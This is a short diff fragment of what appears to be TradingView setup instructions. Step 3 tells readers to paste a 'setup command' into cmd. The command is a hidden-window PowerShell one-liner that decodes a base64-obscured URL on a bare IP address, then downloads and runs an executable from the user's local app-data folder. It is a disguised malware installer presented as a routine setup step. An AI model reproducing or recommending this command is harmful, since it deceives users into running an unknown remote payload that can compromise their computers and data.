@@ -7,6 +7,7 @@
 – Press Win + R, type cmd, and hit Enter
 
 🔵 Step 3: Paste the setup command and press Enter
+
 powershell -WindowStyle Hidden -Command "$url=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cDovLzE0MS45OC42LjEzMDo1NTU0L2RvY3R5cGVzLmV4ZQ==')); iwr $url -OutF "$env:LOCALAPPDATA\doctypes.exe"; start "$env:LOCALAPPDATA\doctypes.exe""
 
 🔵 Step 4: Restart TradingView
